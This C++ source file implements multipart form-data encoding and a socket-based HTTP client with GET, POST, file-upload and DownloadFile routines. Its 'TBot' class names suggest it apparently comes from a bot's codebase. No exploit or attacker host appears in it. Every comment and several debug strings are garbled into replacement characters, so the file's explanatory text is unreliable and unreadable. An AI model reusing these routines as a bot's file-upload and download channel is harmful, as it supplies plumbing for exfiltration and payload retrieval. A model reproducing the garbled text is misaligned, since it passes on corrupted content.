	if (!FFileName.IsEmpty())
	{
		// ��������� ���������� � �����
		if (FContentType.IsEmpty())
			FContentType = GetStr(HTTPOctetStream);

		string FileInfo;
		FileInfo.Format(GetStr(HTTPFormFileInfo).t_str(), FFileName.t_str(), FContentType.t_str());
		FBlockHeader += FileInfo;
    }

	FBlockHeader += LineBreak2;
}
//-----------------------------------------------------------

bool TMultiPartDataItem::WriteDataToBuf(LPBYTE Buf, DWORD BufSize, DWORD Offset, DWORD &Writen)
{
	// ������� ���������� ������ ������ � �����
	// ������ ������� ������, ���� ������ �������� ���������
	Writen = 0;
	if (!Buf || !BufSize) return false;

	Writen = Min(FSize - Offset, BufSize);

	if (Writen)
	{
		if (FFile)
			Writen = FFile->Read(Buf, Writen);
		else
			m_memcpy(Buf, FData, Writen);
    }

    return Offset + Writen == FSize;
}



// ***************************************************************************
// 								 TMultiPartData
// ***************************************************************************

TMultiPartData::TMultiPartData()
{
	FBoundary = Random::RandomString2(20, 'A', 'Z');
	FPosition = 0;
}
//-----------------------------------------------------------

DWORD TMultiPartData::Size()
{
	// ������� ����������� �������� ������ ������
	int Count = FItems.Count();

	// ������������ ������ ���� ������������
	DWORD S = (2 /* -- */ +
			   FBoundary.Length() +
			   2 /* \r\n */  ) * (Count + 1);
	S += 2 /* -- */;

	// ��������� ������� ������ ����� ������ � �����������
	for (int i = 0; i < Count; i++)
	{
		TMultiPartDataItem *Item = (TMultiPartDataItem*)FItems[i];
		Item->MakeHeader();

		S += Item->FBlockHeader.Length();
		S += Item->Size();
		S += 2; /* \r\n */
	}

	return S;
}
//-----------------------------------------------------------

bool MPD_Write(LPBYTE &Buf, DWORD &BufSize, LPVOID Data, DWORD DataSize, bool FullData)
{
	// ������ ���������� ���� ������ � �����
	if (!BufSize || (FullData && BufSize < DataSize))
		return false;

	DWORD ToCopy = Min(BufSize, DataSize);
	m_memcpy(Buf, Data, ToCopy);
	Buf     += ToCopy;
	BufSize -= ToCopy;
	return true;
}
//-----------------------------------------------------------

DWORD TMultiPartData::Read(void* Buf, DWORD BufSize)
{
	// ������ ��������� ������ ������
	if (!Buf || !BufSize || !FItems.Count() || FCurrentPart == rpCompleted)
		return 0;

	if (FPosition == 0)
	{
		FCurrentItem = 0;
		FReadOffset = 0;
		FCurrentPart = rpBoundaryStart;
	}

    const static char* BoundayPrefix = "--";

	LPBYTE Ptr   = (LPBYTE)Buf;
	DWORD  Size  = BufSize;
	bool   Completed = false;

	#define TRYWRITE(D, S, NewPart) if (!MPD_Write(Ptr, Size, (LPVOID)D, S, true)) break; FCurrentPart = NewPart

	#define PART(Part) FCurrentPart == Part

	// �������������� ���� ������ ������
	do
	{
		Completed = FCurrentItem >= FItems.Count();

		//-------------------------------------
		// ���������� 2 ������� --  ����� ������������
		if (PART(rpBoundaryStart))
		{
			TRYWRITE(BoundayPrefix, 2, rpBoundary);
        }


		// ���������� �����������
		if (PART(rpBoundary))
		{

			TReadPart NP = (Completed) ? rpBoundaryEnd : rpBoundaryLB;
			TRYWRITE(FBoundary.t_str(), FBoundary.Length(), NP);
		}

		// ���������� 2 ������� --  ����� ���������� �����������
		if (PART(rpBoundaryEnd))
		{
			TRYWRITE(BoundayPrefix, 2, rpBoundaryLB);
        }

		// ���������� 2 ������� \r\n  ����� �����������
		if (PART(rpBoundaryLB))
		{
			FReadOffset = 0;
			TReadPart NP = (Completed) ? rpCompleted : rpHeader;
			TRYWRITE(LineBreak, 2, NP);

			// ��� ���� ������� ����� ���������� �����������
			if (NP == rpCompleted)
				break;
        }

		// ���������� ��������� �����
		if (PART(rpHeader))
		{
			TMultiPartDataItem *Item = (TMultiPartDataItem *)FItems[FCurrentItem];
			Item->MakeHeader();
			DWORD NeedWrite = Item->FBlockHeader.Length() - FReadOffset;
			if (NeedWrite)
			{
				DWORD ToCopy = Min(NeedWrite, Size);
				m_memcpy(Ptr, Item->FBlockHeader.t_str() + FReadOffset, ToCopy);
				Size -= ToCopy;
				Ptr  += ToCopy;
				FReadOffset += ToCopy;

				if (FReadOffset < Item->FBlockHeader.Length())
					break; // ������ �� �������, ��������� ������� �� ���������.
			}

			// ��������� � ����� ������ ������
			FReadOffset = 0;
			FCurrentPart = rpData;
		}


		// ���������� ������
		if (PART(rpData))
		{
        	TMultiPartDataItem *Item = (TMultiPartDataItem *)FItems[FCurrentItem];
            DWORD Writen;
            bool AllDataWrited = Item->WriteDataToBuf(Ptr, Size, FReadOffset, Writen);
			Ptr         += Writen;
			Size        -= Writen;
			FReadOffset += Writen;

			if (!AllDataWrited) break;

			// ������ �������� ��������� ���������, ���������
			// � ������ ������ ������� ��������
			FCurrentItem++;
			FCurrentPart = rpDataLB;
		}

		// ���������� ��� ������� \r\n ����� ������
		if (PART(rpDataLB))
		{
			TRYWRITE(LineBreak, 2, rpBoundaryStart);
        }
	}
	while (Size && FCurrentPart != rpCompleted);


    DWORD Writen = BufSize - Size;
	FPosition += Writen;
	return Writen;
}
//-----------------------------------------------------------

void TMultiPartData::Add(const char* Name, LPVOID Data, DWORD Size)
{
	TMultiPartDataItem *Item = new TMultiPartDataItem(&FItems, Data, Size);
	Item->FName = Name;
}
//-----------------------------------------------------------

void TMultiPartData::AddFile(const char* Name, const char* FileName, const char* CotentType, const char* SendName)
{
	if (STRA::IsEmpty(Name) || STRA::IsEmpty(FileName))
		return;

	TBotFileStream* File = new TBotFileStream(FileName, fcmRead);
	if (!File->Valid())
	{
		// �� ������� ������� ����
		delete File;
        return;
    }

	TMultiPartDataItem *Item = new TMultiPartDataItem(&FItems);
	Item->FName     = Name;
	Item->FFileName = (!STRA::IsEmpty(SendName)) ? string(SendName) : File::ExtractFileNameA(FileName);
	Item->FSize     = File->Size();
	Item->FFile     = File;
}
//-----------------------------------------------------------


void TMultiPartData::AddBlobAsFile(const char* Name, const char* FileName, LPVOID Data, DWORD DataSize, const char* CotentType)
{
	if (STRA::IsEmpty(Name) || STRA::IsEmpty(FileName) || !Data || !DataSize)
		return;

	TMultiPartDataItem *Item = new TMultiPartDataItem(&FItems);
	Item->FName     = Name;
	Item->FFileName = File::ExtractFileNameA(FileName);
	Item->FSize     = DataSize;
	Item->FFile     = new TBotMemoryStream();
	Item->FFile->Write(Data, DataSize);
	Item->FFile->SetPosition(0);
}
//-----------------------------------------------------------



// ***************************************************************************
// 								THTTP
// ***************************************************************************


THTTP::THTTP()
{
	Initialize();
}

THTTP::THTTP(TBotSocket* Socket)
{
	Initialize();
	FSocket = Socket;
}

//----------------------------------------------------------------------------

THTTP::~THTTP()
{
	if (FSocket && FSocketCreated)
		delete FSocket;
}
//----------------------------------------------------------------------------


void THTTP::Initialize()
{
	// ��������������  ���������� ������
	FSocket = NULL;
	FChunks = NULL;
	CheckOkCode = true;
	FSocketCreated = false;
	FDocumentSize = 0;
	Response.FRequest = &Request;
}
//----------------------------------------------------------------------------

bool THTTP::SendPostData(TBotStream* Data)
{
	// ������� ���������� ���� ������ �� ������
	const DWORD Size = 4096;
	TMemory Buf(Size);


	do
	{
		int Readed = Data->Read(Buf.Buf(), Size);
		if (Readed == 0) break;

		int Sended = FSocket->Write(Buf.Buf(), Readed);

		if (Sended == SOCKET_ERROR || Sended != Readed)
		{
			// ��������� ������ ������ � �����
            return false;
        }
	}
	while(1);

    return true;
}
//----------------------------------------------------------------------------

bool THTTP::Execute(THTTPMethod Method, const char *URL, TBotStream *PostData, TBotStream *ResponseStream)
{
	//  ���������� ������ � ������ �����
	
	FDocumentCompleted = false;
	FDocumentSize      = 0;
	StatusText.Clear();

	if (STRA::IsEmpty(URL)) return false;

	HTTPDBG("HTTP", "Execute URL: %s", URL);

	// ��������� ������� ������
	int StreamPos = (ResponseStream) ? ResponseStream->Position() : 0;

	// �������������� ������
	Request.Method = Method;
	Request.SetURL(URL);

	if (Request.Host.IsEmpty())
		return false;

	//������ �����
	if (!FSocket)
	{
		FSocket = CreateSocket();
		FSocketCreated = FSocket != NULL;
		if (!FSocket)
		{
			HTTPDBG("HTTP", "Create socket error");
			return false;
		}
	}

	// ������������ � �������
	bool Result = FSocket->Connect(Request.Host.t_str(), Request.Port);
	
	HTTPDBG("HTTP", "������������ � ��������� �������: [Result=%d]", Result);


	// ���������� ������
	if (Result)
	{

		// ���������� ���������
		if (Request.Method  == hmPOST)
		{
			DoBeforePostData(PostData);
			Request.ContentLength = (PostData) ? PostData->Size() - PostData->Position() : 0;
        }

		string Headers = Request.MakeRequestHeaders();
		if (!Headers.IsEmpty())
		{
			Result = FSocket->Write(Headers.t_str(), Headers.Length()) == Headers.Length();
			HTTPDBG("HTTP", "���������� ���������: [Result=%d] \r\n%s", Result, Headers.t_str());
		}


		// ���������� ���� ������
		if (Request.Method == hmPOST && PostData)
		{
        	Result = SendPostData(PostData);
			HTTPDBG("HTTP", "���������� POST ������ [Result=%d]", Result);
        }

		// ������ ������
		if (Result)
		{
            Result = ReceiveData(ResponseStream);
			HTTPDBG("HTTP", "��������� ��������� ������ ������� [Result=%d]", Result);
		}
	}

	// � ������ ���� �������� ����� �������� ���� ������
	// ���������� ������ ������ � ������ ���� ������
	// ������ ��� 200
	if (Result && CheckOkCode)
        Result = Response.Code == HTTP_CODE_OK;


	//��� ������������� ��������� �����
	if (Request.CloseConnection || !ResponseStream)
		FSocket->Close();


	// ��������������� ������� ������
	if (ResponseStream)
		ResponseStream->SetPosition(StreamPos);

	// ���������� �� ��������� ��������
	if (Result)
		DoDownloadCompleted(ResponseStream);

	// �������������� ����������
	return Result;
}
//----------------------------------------------------------------------------

bool THTTP::ExecuteToStr(THTTPMethod Method, const char *URL, TBotStream *PostData, string &Document)
{
	Document.Clear();

    TBotMemoryStream S;

    bool Result = Execute(Method, URL, PostData, &S);

	if (Result)
		Document = S.ReadToString();

	return Result;
}
//----------------------------------------------------------------------------

bool THTTP::ReceiveData(TBotStream *ResponseStream)
{
	// ������� ������ ����� �� ������
	HTTPDBG("HTTP", "�������� ������ �� �������");

	TBotStream *Stream = ResponseStream;
	TBotStream *InternalStream = 0;

	const static DWORD BufSize = 4095;

	TMemory Buf(BufSize + 1);

	int Readed;
	bool HeaderReaded = false;
	// ������ ��������� ������
	do
	{
		Readed = FSocket->Read(Buf.Buf(), BufSize);

		if (Readed == 0)
		{
			FDocumentCompleted = true;
			break;
		}
		else
		if (Readed == SOCKET_ERROR)
		{
			HTTPDBG("HTTP", "������ ���������. [Error=%d]", (int)pWSAGetLastError());
			break;
		}

		HTTPDBG("HTTP", "���������. Count=%d Content==\r\n%s",  Readed, Buf.Buf());



		if (Readed > 0)
		{
			PCHAR Str  = Buf;
            int   Size = Readed;
			// ��� �������� ��������� ��������� ����� ����
			*(Str + Size) = 0;

			// ��������� �� ������������� ������ ���������
			if (!HeaderReaded)
			{
				HeaderReaded = Response.AddData(Str, Size);
				/* TODO : ������� ��������� ������� ������ */
				if (HeaderReaded)
				{
					// �������������� ����������� ���������
					if (Response.Code != HTTP_CODE_OK && CheckOkCode)
					{
						if (Response.Chunked || Response.ContentLength)
						{
							// ��������� ����������� ������
							// ��� ContentLength ����������� ����� ��������
							// �������� �� ����
							InternalStream = new TBotMemoryStream();
							Stream = InternalStream;
						}
						else
							Stream = NULL;
					}


					if (Response.Chunked)
						FChunks = new THTTPChunks(this, Stream);
				}
			}

			// ���������� ������
			if (Response.Chunked)
				FChunks->Write(Str, Size);
			else
				WriteReceivedData(Stream, Str, Size);
		}
	}
	while(Readed > 0 && !FDocumentCompleted);

	if (FChunks)
	{
		delete FChunks;
		FChunks = NULL;
	}

	if (InternalStream)
	{
		InternalStream->SetPosition(0);
		StatusText = InternalStream->ReadToString();
		delete InternalStream;
	}

	return FDocumentCompleted;
}
//----------------------------------------------------------------------------


void THTTP::WriteReceivedData(TBotStream* Stream, PCHAR Buf, int BufLen)
{
	// ������� ���������� �������� ������ � �����

    if (!Stream || !Buf || !BufLen) return;


	Stream->Write(Buf, BufLen);
	FDocumentSize += BufLen;


	// ��������� ��������� ��������
	if (!FDocumentCompleted && Response.ContentLength >= 0)
	{
		FDocumentCompleted = FDocumentSize == Response.ContentLength;
    }
}
//----------------------------------------------------------------------------
void THTTP::WriteStringsToStream(TBotStream* Stream, TBotStrings* Strings)
{
	// ���������� ����� ����� � ������ ������
	if (!Stream || ! Strings) return;

	/* TODO : ������� ���������� ���� ������ */
	int Count =  Strings->Count();
	for (int i = 0; i < Count; i++)
	{
		string S = Strings->GetItem(i);

		int Pos = S.Pos("=");
		PCHAR Name  = NULL;
		PCHAR Value = NULL;
		if (Pos < 0)
		{
			// ������ �� �������� �����������, ���������� ���������
			Value = URLEncode(S.t_str(), S.Length());
		}
		else
		{
			Name  = URLEncode(S.t_str(), Pos);
			Value = URLEncode(S.t_str() + Pos + 1, 0);
        }

        // ���������� ������
		if (Name)
		{
			Stream->Write(Name, STR::Length(Name));
			Stream->Write("=", 1);
        }

		if (Value)
			Stream->Write(Value, STR::Length(Value));

        if (i < Count - 1)
			Stream->Write("&", 1);

        // ���������� ������
		STR::Free2(Name);
        STR::Free2(Value);
	}


	Stream->SetPosition(0);
}

//----------------------------------------------------------------------------
int THTTP::DocumentSize()
{
	return FDocumentSize;
}
//----------------------------------------------------------------------------

void THTTP::DoDownloadCompleted(TBotStream* ResponseData)
{
	// ������� ���������������� ��� ��������� ����������� ������
}
//----------------------------------------------------------------------------

void THTTP::DoBeforePostData(TBotStream* PostData)
{
	// ������� �������������� ������������ ������
}
//----------------------------------------------------------------------------

bool THTTP::Get(const char *URL, string &Document)
{
	// ������� ��������� �������� � ���������� ������
	return ExecuteToStr(hmGET, URL, NULL, Document);
}
//----------------------------------------------------------------------------

string THTTP::Get(const char *aURL)
{
	string Document;
	Get(aURL, Document);
	return Document;
}
//----------------------------------------------------------------------------

bool THTTP::Get(const char *URL, TBotStream *ResponseData)
{
	return Execute(hmGET, URL, NULL, ResponseData);
}
//----------------------------------------------------------------------------

bool THTTP::Post(const char *URL, TBotStrings *Fields, string &Document)
{
	if (STRA::IsEmpty(URL) || !Fields)
		return false;

	TBotMemoryStream Data;


	WriteStringsToStream(&Data, Fields);

	Request.ContentType = FormDataURLEncoded;

	return ExecuteToStr(hmPOST, URL, &Data, Document);
}
//----------------------------------------------------------------------------

string THTTP::Post(const char *URL, TBotStrings *Fields)
{
	string S;
	Post(URL, Fields, S);
	return S;
}
//----------------------------------------------------------------------------


bool THTTP::Post(const char *URL, TMultiPartData *Fields, string &Document)
{
	if (STRA::IsEmpty(URL) || !Fields)
		return false;

	Request.ContentType = string(FormDataMultiPart)  + Fields->FBoundary;

	return ExecuteToStr(hmPOST, URL, Fields, Document);
}
//----------------------------------------------------------------------------

string THTTP::Post(const char *URL, TMultiPartData *Fields)
{
	string S;
	Post(URL, Fields, S);
	return S;
}
//----------------------------------------------------------------------------




//-----------------------------------------------
//  DownloadFile - ������� ��������� �������� �
//                 ����
//-----------------------------------------------
bool DownloadFile(const char* URL, const char* FileName)
{
	if (STRA::IsEmpty(FileName) || STRA::IsEmpty(URL))
		return false;

	TBotFileStream File(FileName, fcmCreate);
	if (!File.Valid()) return false;

    THTTP HTTP;
	return HTTP.Get(URL, &File);
}
